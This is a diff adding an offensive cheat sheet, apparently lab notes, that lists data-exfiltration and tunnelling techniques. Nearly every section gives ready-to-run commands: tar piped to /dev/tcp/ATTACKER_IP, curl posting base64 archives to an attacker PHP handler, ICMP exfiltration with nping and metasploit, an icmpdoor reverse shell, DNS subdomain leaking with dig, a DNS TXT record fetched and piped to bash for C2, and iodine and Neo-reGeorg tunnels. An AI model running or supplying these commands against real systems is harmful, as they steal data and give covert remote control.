@@ -1,0 +1,120 @@
+- tcp connexion + data encoding
+    - tools: 
+        - non standard protocol
+        - /dev/tcp, nc, ...
+    - walkthrough
+        - attacking machine :
+            - nc -nlvp 4444 > DATA
+        - victim : 
+            - tar zcf - DATA | base64 | dd conv=ebcdic > /dev/tcp/ATTACKER_IP/4444
+        - decode data on attacker : 
+            - dd conv=ascii if=DATA |base64 -d > DATA.tar
+            - tar xvf DATA.tar
+
+- ssh : 
+    - tools : 
+        - scp, ssh client
+    - walkthrough: 
+        - tar cf - DATA | ssh ATTACKER@ATTACKER_IP "cd /tmp/; tar xpf -"
+
+- http post request : 
+    - requirements : 
+        - a web server
+    - tools : 
+        - curl
+    - walkthrough :
+        - the attacker start a web server : http://ATTACKER_DOMAIN
+        - file handler :
+            - page : /contact.php
+            - content : <?php 
+                if (isset($_POST['file'])) {
+                        $file = fopen("/tmp/http.bs64","w");
+                        fwrite($file, $_POST['file']);
+                        fclose($file);
+                }
+            ?>
+        - victim : 
+            - curl --data "file=$(tar zcf - DATA | base64)" http://ATTACKER_DOMAIN/contact.php
+        - correct broken url encoded base64 : 
+            - code : sudo sed -i 's/ /+/g' /tmp/http.bs64
+
+- http tunneling
+    - tools :
+        - https://github.com/L-codes/Neo-reGeorg
+    - method : 
+        - generate the backdoor web page with the key KEY : 
+            - python3 neoreg.py generate -k KEY
+        - transfert the backdoor to the bridge
+        - connect to the bridge : 
+            - python3 neoreg.py -k KEY -u http://BRIDGE_IP/PATH/TO/BACKDOOR.php 
+        - use the backdoor as port forwarding : 
+            - curl --socks5 127.0.0.1:1080 http://TARGET_IP:WEB_PORT
+
+- icmp data :
+    - tools :
+        - sender : 
+            - ping, nping
+            - https://nmap.org/nping/
+            - https://github.com/krabelize/icmpdoor
+        - receiver : metasploit
+    - walkthrough : 
+        - exfiltrate data : 
+            - attacker: 
+                - configure the metasploit  listener : 
+                    - use auxiliary/server/icmp_exfil
+                    - set BPF_FILTER icmp and not src ATTACKER_IP
+                    - set INTERFACE eth0
+                    - run
+            - victim : 
+                - send bof : sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"
+                - send the actual data : sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "data"        
+                - terminate : sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
+        - reverse shell : 
+            - victim :
+                - start connection : sudo icmpdoor -i eth0 -d ATTACKER_IP
+            - attacker : 
+                - establish connexion : sudo icmp-cnc -i eth1 -d 192.168.0.121
+
+- dns config : 
+    - requirements: 
+        - a domain name 
+        - all records (ns,txt,a,...)
+    - method : 
+        - data exfiltration: 
+            - on the NS configured attacker : 
+                - listen to any dns request : sudo tcpdump -i eth0 udp port 53 -v 
+            - from the victim : 
+                - encode the data : hex,base64, .... (printable)
+                - encode the data and attach it to become a subdomain : 
+                    - command 1 : cat DATA | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.ATTACKER_DOMAIN/'
+                    - command 2 : cat DATA |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/ATTACKER_DOMAIN/
+                - send the data using dig :
+                    - full command : cat DATA |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/ATTACKER_DOMAIN/ | awk '{print "dig +short " $1}' | bash
+            - retrieve the data : 
+                - stop tcpdump and reassemble the base64 data and decode
+                    - example : echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
+        - c2 execution : 
+            - base64 encode the code
+            - register the code as a txt record of the domain
+            - victim : 
+                - check the txt record of the attacker : 
+                    - code : dig +short -t TXT script.tunnel.com
+                - execute the code ; 
+                    - code : dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
+
+- dns tunneling: 
+    - tools : 
+        - https://github.com/yarrick/iodine
+    - method : 
+        - on the bridge : 
+            - start the iodined server : 
+                - command : sudo iodined -f -c -P PASSWORD 10.1.1.1/24 ATTACKER_DOMAIN
+        - on the attacker : 
+            - connect to the iodined server : 
+                - command : sudo iodine -P PASSWORD ATTACKER_DOMAIN 
+            - create a proxy using ssh : 
+                - command : ssh USER@10.1.1.2 -4 -f -N -D 1080
+            - exploit : 
+                - proxychains curl http://192.168.0.100/demo.php
+                - curl --socks5 127.0.0.1:1080 http://192.168.0.100/demo.php
+                - foxyproxy 127.0.0.1:1080 ==> http://192.168.0.100/demo.php
